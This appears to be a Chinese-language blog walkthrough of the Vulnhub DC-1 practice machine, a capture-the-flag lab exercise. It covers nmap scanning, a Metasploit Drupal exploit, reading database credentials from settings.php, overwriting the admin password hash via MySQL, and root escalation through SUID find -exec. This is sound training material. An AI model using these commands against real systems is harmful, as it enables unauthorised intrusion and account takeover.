# **实战打靶vulnhub--DC-1**

## 一， **部署方法**

  1. 在官网上下载zip压缩包
  2. 下载到本地上解压缩后使用虚拟机导入.ova后缀的文件（在过程中出现问题不用理睬，点击重试即可）
  3. 配置网络，本人设置的是nat模式，这个看个人需求
  4. 打开靶机即可

## 二， **靶机地址和描述**

### 1\. **下载地址**

> http://www.five86.com/downloads/DC-1.zip

### 2\. **靶机描述**

![1670499546_6391ccdab1b141f15d0dd.png!small?1670499547858](https://image.3001.net/images/20221208/1670499546_6391ccdab1b141f15d0dd.png!small?1670499547858)

这靶机中有5个flag，最终的目标是找到root目录下的flag

## 三， **测试**

### 1\. **信息收集**

首先扫描网段

> arp-scan -l

![1670499560_6391cce8990ba021275d0.png!small?1670499561731](https://image.3001.net/images/20221208/1670499560_6391cce8990ba021275d0.png!small?1670499561731)

这里发现192.168.237.143是靶机的IP地址

接下来使用nmap命令对靶机进行全面扫描

> nmap -T4 -sC -sV 192.168.237.143

![1670499573_6391ccf57c9ffbe81b6fe.png!small?1670499574618](https://image.3001.net/images/20221208/1670499573_6391ccf57c9ffbe81b6fe.png!small?1670499574618)

扫描后发现开放了三个端口

22端口对应ssh服务

80端口对应web服务

而且发现靶机的HTTP站点是Drupal站点

访问站点

![1670499580_6391ccfc31170ab58ad52.png!small?1670499581203](https://image.3001.net/images/20221208/1670499580_6391ccfc31170ab58ad52.png!small?1670499581203)

确认该站点的CMS是drupal

### 2\. **漏洞发现**

这里使用msf进行漏洞探测和利用

msfconsole打开msf工具

使用search drupal搜索相关的漏洞利用模块

![1670499669_6391cd55d8bab47d602c0.png!small?1670499670954](https://image.3001.net/images/20221208/1670499669_6391cd55d8bab47d602c0.png!small?1670499670954)

这里发现有两个关于http的漏洞利用模块，根据Rank的值，果断选择2模块

使用use 2利用该模块

使用Show options查看需要进行的设置

![1670499675_6391cd5b794dd70e0e7b7.png!small?1670499676742](https://image.3001.net/images/20221208/1670499675_6391cd5b794dd70e0e7b7.png!small?1670499676742)

这里发现需要设置RHOSTS的值

所以使用set RHOSTS 192.168.237.143 进行设置RHOSTS的值

接着使用run 进行利用该模块

![1670499683_6391cd636ed1f1eed7381.png!small?1670499684419](https://image.3001.net/images/20221208/1670499683_6391cd636ed1f1eed7381.png!small?1670499684419)

成功利用

### 3\. **漏洞利用**

输入shell即可获得靶机的webshell

使用whoami查看当前用户

![1670499689_6391cd69002bb18045427.png!small?1670499689909](https://image.3001.net/images/20221208/1670499689_6391cd69002bb18045427.png!small?1670499689909)

使用ls -al 查看当前目录下的所有文件及其权限

![1670499694_6391cd6e2a4a19de7aa1a.png!small?1670499695342](https://image.3001.net/images/20221208/1670499694_6391cd6e2a4a19de7aa1a.png!small?1670499695342)

发现第一个flag

使用cat flag.txt进行查看文件内容

![1670499700_6391cd749a7108fc51757.png!small?1670499701549](https://image.3001.net/images/20221208/1670499700_6391cd749a7108fc51757.png!small?1670499701549)

每一个好的CMS都需要一个配置文件-你也一样

根据提示，百度搜索drupal的默认配置文件

![1670499703_6391cd779708c9dffca25.png!small?1670499704491](https://image.3001.net/images/20221208/1670499703_6391cd779708c9dffca25.png!small?1670499704491)

得知文件名为settings.php

这里使用python -c "import pty;pty.spawn('/bin/bash')"进行交互性shell

![1670499708_6391cd7caf385a915abb7.png!small?1670499709621](https://image.3001.net/images/20221208/1670499708_6391cd7caf385a915abb7.png!small?1670499709621)

交互性shell：可以执行一些需要上下文的命令，并且需要回显信息

这里使用find -name settings.php查找文件的位置

![1670499712_6391cd8000ff7297a46c7.png!small?1670499712932](https://image.3001.net/images/20221208/1670499712_6391cd8000ff7297a46c7.png!small?1670499712932)

使用cat ./sites/default/settings.php | more 进行查看settings.php的内容

![1670499753_6391cda97a40f88e94f79.png!small?1670499754611](https://image.3001.net/images/20221208/1670499753_6391cda97a40f88e94f79.png!small?1670499754611)

这里不仅发现了第二个flag，还有数据库的账号和密码

Flag2:蛮力和字典攻击不是获取访问权限的唯一方法（你需要访问权限），你可以使用这些凭据做什么呢？

这里使用账号密码进行登录数据库

> mysql -u dbuser -pR0ck
>
>
> ![1670499773_6391cdbd0645e9d7418e3.png!small?1670499774151](https://image.3001.net/images/20221208/1670499773_6391cdbd0645e9d7418e3.png!small?1670499774151)

使用show databases;查看数据库

![1670499777_6391cdc14c53b513420b1.png!small?1670499778532](https://image.3001.net/images/20221208/1670499777_6391cdc14c53b513420b1.png!small?1670499778532)

根据drupaldb猜测到这个是drupalCMS的数据库

使用use drupaldb;进入到数据库中，再使用show tables;查看库内的所有表。

![1670499781_6391cdc57e56353d388d2.png!small?1670499782682](https://image.3001.net/images/20221208/1670499781_6391cdc57e56353d388d2.png!small?1670499782682)

发现这其中有users的表

![1670499787_6391cdcb842b5a6cf9c0e.png!small?1670499788471](https://image.3001.net/images/20221208/1670499787_6391cdcb842b5a6cf9c0e.png!small?1670499788471)

使用select * from users\G ，纵向的显示users所有字段的内容

![1670499792_6391cdd00a15ae8242df5.png!small?1670499793202](https://image.3001.net/images/20221208/1670499792_6391cdd00a15ae8242df5.png!small?1670499793202)

发现存在admin的用户但是密码被加密。通过搜索资料后这种密码的加密方法不可逆。无法解密。

但是drupal提供了可以直接修改管理员密码的方法。在scripts目录下存在一个password-hash.sh的文件，这可以将你输入进去明文密码转为hash值

在/var/www/下使用php scripts/password-hash.sh 123 即可生成123这个字符串的hash值

![1670499796_6391cdd4e5f64cb102664.png!small?1670499797872](https://image.3001.net/images/20221208/1670499796_6391cdd4e5f64cb102664.png!small?1670499797872)

复制得到的hash值

再次进入到数据库中，使用update drupaldb.users set pass=”【hash值】” where name=’admin’;

![1670499802_6391cddaef30506e605ed.png!small?1670499803925](https://image.3001.net/images/20221208/1670499802_6391cddaef30506e605ed.png!small?1670499803925)

使用select * from drupaldb.users where name=’admin’\G;再次检查admin的密码是否被修改

![1670499807_6391cddf36892876331bd.png!small?1670499808421](https://image.3001.net/images/20221208/1670499807_6391cddf36892876331bd.png!small?1670499808421)

打开站点，使用admin;123进行登陆，成功登录

![1670499829_6391cdf54635bbd5e993c.png!small?1670499830306](https://image.3001.net/images/20221208/1670499829_6391cdf54635bbd5e993c.png!small?1670499830306)

在上面有很多的功能点，如果不知道意思，可以一个一个点击查看

在Dashboard下出现flag3

![1670499835_6391cdfb1e8c932bdb07e.png!small?1670499836331](https://image.3001.net/images/20221208/1670499835_6391cdfb1e8c932bdb07e.png!small?1670499836331)

点击进行查看

![1670499838_6391cdfeb6fc14f2bf807.png!small?1670499839712](https://image.3001.net/images/20221208/1670499838_6391cdfeb6fc14f2bf807.png!small?1670499839712)

出现第三个flag：特殊权限将有助于查找密码，但是需要-exec命令才能获取阴影中的内容

发现在其中有两个特殊的大写字母，PERMS和FIND，这里猜测是方法。

首先使用find / -name “flag*”查找所有以flag开头的文件

![1670499842_6391ce02a3f089301ee42.png!small?1670499844016](https://image.3001.net/images/20221208/1670499842_6391ce02a3f089301ee42.png!small?1670499844016)

发现第四个flag

使用cat /home/flag4/flag4.txt进行查看flag4的内容

![1670499847_6391ce0739c0f203b1da3.png!small?1670499848212](https://image.3001.net/images/20221208/1670499847_6391ce0739c0f203b1da3.png!small?1670499848212)

Flag4：你可以使用相同的方法在root权限内找到flag，大概，或许没这么简单，或者呢？

根据这些内容，推测下一步会进行提权操作，从而获得root权限，找到flag5

根据flag3中的另一个大写字母PERMS，猜测是使用SUID提权

使用find / -user root -perm -4000 -print 2>/dev/null查找所有具有SUID权限且属于root的文件。

![1670499853_6391ce0d87d54dbf98138.png!small?1670499854648](https://image.3001.net/images/20221208/1670499853_6391ce0d87d54dbf98138.png!small?1670499854648)

发现find命令，根据-exec，可以确认使用find进行提权

使用touch abc 创建提权需要的文件，然后使用find abc -exec ‘/bin/sh/’ \;进行提权

![1670499856_6391ce10f262eed8ede9f.png!small?1670499858047](https://image.3001.net/images/20221208/1670499856_6391ce10f262eed8ede9f.png!small?1670499858047)

成功获得root权限

使用cd /root进入root目录下，使用ls查看当前目录下的文件

![1670499861_6391ce152d3d2ddac17ff.png!small?1670499862066](https://image.3001.net/images/20221208/1670499861_6391ce152d3d2ddac17ff.png!small?1670499862066)

使用cat thefinalflag.txt进行查看最后的flag

![1670499864_6391ce18db7ec5a9d595f.png!small?1670499865958](https://image.3001.net/images/20221208/1670499864_6391ce18db7ec5a9d595f.png!small?1670499865958)

成功获取全部的flag！！

###  **渗透结束！！**

## 四， **知识点总结**

> nmap的使用
>
> 使用msf进行渗透
>
> 利用python进行交互式shell
>
> 数据库的查看，增加，删除，修改密码等
>
> SUID提权
>
> Find提权

